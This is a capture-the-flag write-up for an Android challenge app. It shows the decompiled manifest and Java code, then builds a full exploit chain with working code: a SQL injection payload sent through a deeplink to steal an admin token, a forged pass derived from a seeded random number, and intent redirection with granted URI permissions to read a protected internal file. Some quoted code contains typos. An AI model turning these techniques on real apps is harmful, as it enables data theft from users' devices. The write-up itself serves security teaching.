# ZiggyZagga - Proof of Concept

> Cybreak 2026 - Reverse - Medium - DJumanto

## Unpacking the App
initially the application is heavily packed with DPT-Shell protection. So any class and activity will be duar duar stripped and only left some initial classes. However, the AndroidManifest.xml still giving us the big picture of the application activities and provider.

### Main Activity
```xml
<activity
    android:theme="@style/Theme.Ziggyzagga"
    android:label="@string/app_name"
    android:name="com.cybreak.ziggyzagga.MainActivity"
    android:exported="true">
    <intent-filter>
        <action android:name="android.intent.action.MAIN"/>
        <category android:name="android.intent.category.LAUNCHER"/>
    </intent-filter>
    <intent-filter>
        <action android:name="android.intent.action.VIEW"/>
        <category android:name="android.intent.category.DEFAULT"/>
        <category android:name="android.intent.category.BROWSABLE"/>
        <data
            android:scheme="ziggyzagga"
            android:host="login"/>
    </intent-filter>
</activity>
```

### Bless Activity
```xml
<activity
    android:theme="@style/Theme.Ziggyzagga"
    android:name="com.cybreak.ziggyzagga.BlessActivity"
    android:exported="true"
    android:excludeFromRecents="true"
    android:noHistory="true">
    <intent-filter>
        <action android:name="android.intent.action.VIEW"/>
        <category android:name="android.intent.category.DEFAULT"/>
        <category android:name="android.intent.category.BROWSABLE"/>
        <data
            android:scheme="ziggyzagga"
            android:host="bless"/>
    </intent-filter>
</activity>
```

### Custom File Provider
```xml
<provider
    android:name="com.cybreak.ziggyzagga.ZiggyProvider"
    android:writePermission="false"
    android:exported="false"
    android:authorities="com.cybreak.ziggyzagga.ZiggyProvider"
    android:grantUriPermissions="true">
    <intent-filter>
        <action android:name="android.intent.action.VIEW"/>
        <category android:name="android.intent.category.DEFAULT"/>
    </intent-filter>
</provider>
```

Seems like there're 2 activities that accept deeplink with their own path, and a provider that has ``grantUriPermissions=true`` which allowed us to read internal files. However it's not accessible directly from outside. which means we need a way where the application gives us the uri permissions.

So the next steps is because we don't know how the logic actually works, we need to unpack it (obviously). Looking at github repos and some youtube videos will return you various method to unpack the dpt shell.

## Attack Path after Unpacking
As always, to solve a problem, i always use the backtrack method on how do we get the flag to where can we supplied the initial data. Since the flag located in internal files, we need to find out how we can arbitrary read internal files. Luckily, the bless activity gives the clue clearly

### Bless Activity Intent Redirection
```java
if (getIntent().getBooleanExtra("WeatherReport", false) && zHandleIt) {
    setResult(-1, getIntent()); //arbitrary intent return
    finish();
    return;
}
return;
```

It returns any intent data without sanitazion, however there're some checks they did before reaching it, which is a boolean ``WeatherReport`` extra, and zHandleIt value, which returned from handleIt() function

```java
private final boolean handleIt(Intent intent, Context context) {
    if (intent != null) {
        String action = intent.getAction();
        Uri data = intent.getData();
        if (Intrinsics.areEqual(action, "android.intent.action.VIEW") && data != null) {
            String queryParameter = data.getQueryParameter("vip_pass");
            if (queryParameter != null) {
                DbUtils dbUtils = this.db;
                if (dbUtils == null) {
                    Intrinsics.throwUninitializedPropertyAccessException("db");
                    dbUtils = null;
                }
                if (Intrinsics.areEqual(md5(dbUtils.getAdminToken() + "|" + new Random(1337L).nextInt()).toString(), queryParameter)) {
                    return true;
                }
            } else {
                setResult(0);
            }
        }
    }
    return false;
}
```

The checks status is done by checking if ``vip_pass`` extras aren't null, and if it's value is equals to ``md5(adminToken + "|" + random(1337))``. As you  notice, the random value is seeded, where we can later reproduce it's value by utilizing the same seed. The admin token itself is retrieved from database DbUtils Class:

```java
public final String getAdminToken() {
    String string;
    Cursor cursorRawQuery = getReadableDatabase().rawQuery("SELECT priv_token from users where is_admin = 1", null);
    Intrinsics.checkNotNullExpressionValue(cursorRawQuery, "rawQuery(...)");
    Cursor cursor = cursorRawQuery;
    try {
        Cursor cursor2 = cursor;
        if (!cursor2.moveToFirst()) {
            string = "";
        } else {
            string = cursor2.getString(cursor2.getColumnIndexOrThrow(PRIVTOK_COL));
        }
        Unit unit = Unit.INSTANCE;
        CloseableKt.closeFinally(cursor, null);
        return string;
    } finally {
    }
}
```

So what do we need next is the adminToken from the database.

## SQL Injection in Main Activity
In main acitivy, there's an user supplied data which will be used in sql query, which is the loginMin function. The function it self will return the data from the query to the callee as long as it's not empty, and no error in the process.

### LoginMin Function
```java
public final void loginMin(Context context, String username, String password) {
    Intrinsics.checkNotNullParameter(context, "context");
    Intrinsics.checkNotNullParameter(username, "username");
    Intrinsics.checkNotNullParameter(password, "password");
    try {
        DbUtils dbUtils = this.db;
        if (dbUtils == null) {
            Intrinsics.throwUninitializedPropertyAccessException("db");
            dbUtils = null;
        }
        Cursor cursorLogin = dbUtils.login(username, password); //injected data here
        try {
            Cursor cursor = cursorLogin;
            if (cursor.moveToFirst()) {
                Intent intent = new Intent();
                intent.putExtra(NotificationCompat.CATEGORY_STATUS, "success");
                Iterator it = ArrayIteratorKt.iterator(cursor.getColumnNames());
                while (it.hasNext()) {
                    String str = (String) it.next();
                    intent.putExtra(str, cursor.getString(cursor.getColumnIndexOrThrow(str)));
                }
                cursor.close();
                Activity activity = context instanceof Activity ? (Activity) context : null;
                if (activity != null) {
                    activity.setResult(-1, intent);
                    Unit unit = Unit.INSTANCE;
                }
            } else {
                Intent intent2 = new Intent();
                intent2.putExtra(NotificationCompat.CATEGORY_STATUS, "error");
                intent2.putExtra("message", "Invalid username or password");
                cursor.close();
                Activity activity2 = context instanceof Activity ? (Activity) context : null;
                if (activity2 != null) {
                    activity2.setResult(0, intent2);
                    Unit unit2 = Unit.INSTANCE;
                }
            }
            CloseableKt.closeFinally(cursorLogin, null);
        } finally {
        }
    } catch (Exception unused) {
        Intent intent3 = new Intent();
        intent3.putExtra(NotificationCompat.CATEGORY_STATUS, "error");
        Activity activity3 = context instanceof Activity ? (Activity) context : null;
        if (activity3 != null) {
            activity3.setResult(0, intent3);
        }
    }
    Activity activity4 = context instanceof Activity ? (Activity) context : null;
    if (activity4 != null) {
        activity4.finish();
    }
}
```

in the DbUtils itself, there's no sanitizing or checking which allowed us to gain sql injection attack:
```java
public final Cursor login(String username, Stringpassword) {
    Intrinsics.checkNotNullParameter(username, "uername");
    Intrinsics.checkNotNullParameter(password, "password");
    Cursor cursorRawQuery = getReadableDatabase()rawQuery("SELECT * from users where username = '" + username + "' and password = '" + password + "'", null); // no sanitazion
    Intrinsics.checkNotNullExpressionValue(cursorawQuery, "rawQuery(...)");
    return cursorRawQuery
}
```

So the attack flow will be more or less like this:
1. Start the MainAcitivity with user and password filled with the sql injection payload so we can get the priv_token
2. Retrieve the sql injection data and generate the vip_pass value
3. Start the BlessActtivity with the vip_pass value and the provider url directed to the flag.png file, and use the grantURIpermission flag.
4. Retrieve the flag, and vuala.

## Exploitation

### SQL Injection
To exploit the sql injection, the method is very simple, no itty bitty bypass, we can use normal sql injection method as part of the data query parameter:
```java
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.activity_main);
    var deeplink = Uri.parse("ziggyzagga://login?username=%27%20OR%20is_admin%3D1%20--%20-&password=x");
    var intent = new Intent(Intent.ACTION_VIEW);
    intent.setData(deeplink);
    startActivityForResult(intent,1);
}
```

Then we can parse the result to get the priv_token from admin:
```java
protected void onActivityResult(int requestCode, int resultCode, Intent data) {
    super.onActivityResult(requestCode, resultCode, data);
    if(requestCode == 1 && data != null) {
        var extras = data.getExtras();
        var priv_token = extras.get("priv_token").toString();
        Log.d("priv_token", priv_token);
    }
}
....
```
We will get the priv_token for the admin

### Generate vip_pass via Seeded Random Number
Since we already have the priv_token, generating the vip_pass is easy as flipping coin because the random number generation is seeded to 1337:
```java
protected void onActivityResult(int requestCode, int resultCode, Intent data) {
    super.onActivityResult(requestCode, resultCode, data);
    if(requestCode == 1 && data != null) {
        var extras = data.getExtras();
        var priv_token = extras.get("priv_token").toString();
        Log.d("priv_token", priv_token);
        var rand_number = new Random(1337).nextInt();
        Log.d("random_number",String.format("%d",rand_number));
        var vip_pass = generateMd5(priv_token+"|"+rand_number);
        Log.d("vip_pass_generated",vip_pass);
    }
}

private String generateMd5(String info) {
    try {
        MessageDigest md = MessageDigest.getInstance("MD5");
        byte[] digest = md.digest(info.getBytes(StandardCharsets.UTF_8));
        String hexString = new BigInteger(1, digest).toString(16);
        return String.format("%32s", hexString).replace(' ', '0');
    } catch (NoSuchAlgorithmException e) {
        throw new RuntimeException("MD5 algorithm not found", e);
    }
}
....
```

### Start BlessActivity to Activate Arbitrary Internal File Read Access

with vip_pass generated, now we just need to fulfill what needed to access the arbtirary intent redirection vuln, which gives us access to red internal files. The quetion is, if we needed to use ziggyzagga:// scheme and bless host, how do we can adding the uri for the provider (content://com.cybreak.ziggyzagga.ZiggyProvider)? Well we can use ``ClipData`` to add another uri there.

```java
protected void onActivityResult(int requestCode, int resultCode, Intent data) {
    super.onActivityResult(requestCode, resultCode, data);
    if(requestCode == 1 && data != null) {
        var extras = data.getExtras();
        var priv_token = extras.get("priv_token").toString();
        Log.d("priv_token", priv_token);
        var rand_number = new Random(1337).nextInt();
        Log.d("random_number",String.format("%d",rand_number));
        var vip_pass = generateMd5(priv_token+"|"+rand_number);
        Log.d("vip_pass_generated",vip_pass);
        var uri = Uri.parse("ziggyzagga://bless?vip_pass="+vip_pass);
        var intent = new Intent(Intent.ACTION_VIEW);
        intent.setData(uri);
        intent.putExtra("WeatherReport",true);
        intent.setClipData(ClipData.newRawUri("", Uri.parse("content://com.cybreak.ziggyzagga.ZiggyProvider/flag.png")));
        intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
        startActivityForResult(intent,2);
    }
}
```

Now just handle the intent result, and we can read the flag
```java
protected void onActivityResult(int requestCode, int resultCode, Intent data) {
    super.onActivityResult(requestCode, resultCode, data);
    if(requestCode == 1 && data != null) {
        var extras = data.getExtras();
        var priv_token = extras.get("priv_token").toString();
        Log.d("priv_token", priv_token);
        var rand_number = new Random(1337).nextInt();
        Log.d("random_number",String.format("%d",rand_number));
        var vip_pass = generateMd5(priv_token+"|"+rand_number);
        Log.d("vip_pass_generated",vip_pass);
        var uri = Uri.parse("ziggyzagga://bless?vip_pass="+vip_pass);
        var intent = new Intent(Intent.ACTION_VIEW);
        intent.setData(uri);
        intent.putExtra("WeatherReport",true);
        intent.setClipData(ClipData.newRawUri("", Uri.parse("content://com.cybreak.ziggyzagga.ZiggyProvider/flag.png")));
        intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
        startActivityForResult(intent,2);
    }else if(requestCode == 2 && data != null){
        Log.d("Another Callee","Yepp, it's from other activity");
        if (data.getClipData() != null) {
            Log.d("INFO","WOOT WOOT");
            Uri fileUri = data.getClipData().getItemAt(0).getUri();
            try {
                InputStream is = getContentResolver().openInputStream(fileUri);
                ImageView imageView = (ImageView) findViewById(R.id.imageView);
                Bitmap bitmap = BitmapFactory.decodeStream(is);
                imageView.setImageBitmap(bitmap);
            } catch (Exception e) {
                Log.e("EXPLOIT_STATUS", "File read failed", e);
            }
        }
    }
}
```



